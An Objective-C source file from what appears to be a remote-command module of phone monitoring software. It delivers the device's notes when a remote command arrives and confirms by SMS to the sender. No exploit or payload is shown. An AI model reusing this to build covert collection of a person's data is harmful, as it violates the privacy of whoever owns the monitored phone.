//
//  RequestNoteProcessor.m
//  RCM
//
//  Created by Makara Khloth on 1/17/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "RequestNoteProcessor.h"
#import "NoteManager.h"

@interface RequestNoteProcessor (private)
- (void) processRequestNote;
- (void) requestNoteException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation RequestNoteProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestNoteProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	object of RequestNoteProcessor class
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> RequestNoteProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark Overriden method


/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestNoteProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestNoteProcessor--->doProcessingCommand")	
	[self processRequestNote];
}


#pragma mark Private method


/**
 - Method name:			processRequestNote
 - Purpose:				This method is used to process Request Note
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestNote {
	DLog (@"RequestNoteProcessor ---> processRequestNote")
	
	id <NoteManager> noteManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mNoteManager];
	BOOL isReady = [noteManager deliverNote:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request note command")
		[self requestNoteException];
	} else {
		DLog (@".... processing request note command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestNoteException
 - Purpose:				This method is invoked when it fails to send Notes
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestNoteException {
	DLog (@"RequestCalendarProcessor ---> requestNoteException");
	FxException* exception = [FxException exceptionWithName:@"RequestNoteException" andReason:@"Request note error"];
	[exception setErrorCode:kNoteManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	DLog (@"RequestNoteProcessor ---> acknowldgeMessage");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestNoteMSG1", @"")];
	DLog (@"ackMessage %@" , ackMessage)
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestNoteProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request note process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestNoteProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

#pragma mark -
#pragma mark Note manager callback
#pragma mark -

-(void)noteDidDelivered:(NSError *)aError {
	DLog (@"!!!!!!! RequestNoteProcessor ---> noteDidDelivered")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestNoteMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestNoteMSG2", @"")];		
		[self sendReplySMS:requestNoteMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}

- (void) dealloc {
	[super dealloc];
}

@end
